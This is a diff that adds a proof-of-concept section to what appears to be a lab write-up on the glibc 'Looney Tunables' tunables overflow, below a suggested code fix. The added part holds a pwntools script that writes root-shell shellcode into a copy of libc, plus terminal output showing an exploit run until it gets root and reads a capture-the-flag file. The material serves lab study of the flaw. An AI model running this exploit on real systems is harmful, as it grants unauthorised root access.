@@ -152,3 +152,61 @@ with something safer:
     while (*n != '\0' && off < BUFFER_SIZE - 1) tunestr[off++] = *n++;
 
 BUFFER_SIZE should be defined as the maximum size of tunestr.
+
+
+#PoC
+'''
+nopriv@looneytunes:~$ cat gen_libc.py 
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.os = "linux"
+context.arch = "x86_64"
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+d = bytearray(open(libc.path, "rb").read())
+
+sc = asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh())
+
+orig = libc.read(libc.sym["__libc_start_main"], 0x10)
+idx = d.find(orig)
+d[idx : idx + len(sc)] = sc
+
+open("./libc.so.6", "wb").write(d)
+'''
+'''
+nopriv@looneytunes:~$ python3 gen_libc.py 
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+nopriv@looneytunes:~$ gcc exp.c -o exploit 
+nopriv@looneytunes:~$ chmod +x exploit
+nopriv@looneytunes:~$ ./exploit 
+try 100
+try 200
+try 300
+try 400
+try 500
+try 600
+try 700
+try 800
+try 900
+try 1000
+^C
+nopriv@looneytunes:~$ ./exploit 
+try 100
+try 200
+try 300
+try 400
+try 500
+# whoami
+root
+# cd /root
+# cat root.txt
+THM{TH-TH-THATS-SECURE-FOLKS!}
+# exit
+'''
